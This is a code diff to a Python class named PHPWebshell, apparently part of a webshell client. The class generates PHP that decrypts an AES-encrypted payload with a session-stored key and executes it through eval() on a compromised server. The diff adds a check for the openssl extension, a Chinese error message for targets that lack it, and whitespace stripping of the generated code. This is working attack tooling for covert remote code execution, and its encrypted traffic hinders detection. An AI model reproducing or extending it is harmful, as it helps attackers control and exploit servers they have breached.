@@ -773,7 +773,13 @@ class PHPWebshell(PHPSessionInterface):
                 """
                 function aes_enc($data) {
                     $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
-                    $encryptedData = openssl_encrypt($data, 'AES-256-CBC', $_SESSION[SESSION_NAME], 0, $iv);
+                    $encryptedData = openssl_encrypt(
+                        $data,
+                        'AES-256-CBC',
+                        $_SESSION[SESSION_NAME],
+                        0,
+                        $iv
+                    );
                     return base64_encode($iv . base64_decode($encryptedData));
                 }
 
@@ -787,15 +793,22 @@ class PHPWebshell(PHPSessionInterface):
                         substr($data, 0, 16)
                     );
                 }
-                array_push($decoder_hooks, "aes_enc");
-                $code = aes_dec(CODE_ENC);
-                eval($code);
+                if(extension_loaded('openssl')) {
+                    array_push($decoder_hooks, "aes_enc");
+                    $code = aes_dec(CODE_ENC);
+                    eval($code);
+                }else{
+                    decoder_echo("WRONG_NO_OPENSSL");
+                }
+
                 """.replace(
                     "SESSION_NAME", repr(session_name)
-                ).replace(
-                    "CODE_ENC", repr(base64_encode(payload_enc))
                 )
+                .replace("CODE_ENC", repr(base64_encode(payload_enc)))
+                .replace("    ", "")
             )
+            if result_enc == "WRONG_NO_OPENSSL":
+                raise exceptions.UnknownError("目标不支持openssl")
             try:
                 result_enc = base64.b64decode(result_enc)
                 result = decrypt_aes256_cbc(key, result_enc).decode("utf-8")
